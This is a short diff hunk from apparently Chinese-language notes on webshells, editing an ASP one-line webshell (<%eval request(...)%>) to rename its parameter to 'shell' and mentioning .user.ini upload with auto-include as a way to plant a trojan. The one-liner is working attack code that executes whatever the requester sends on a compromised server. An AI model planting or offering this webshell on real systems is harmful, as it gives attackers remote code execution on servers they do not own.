@@ -46,7 +46,7 @@ aspx木马
 asp木马
 
 ```
-<%eval request("hihack")%>
+<%eval request("shell")%>
 ```
 
 特殊：通过上传.user.ini内部增加文件自动包含进行传马攻击
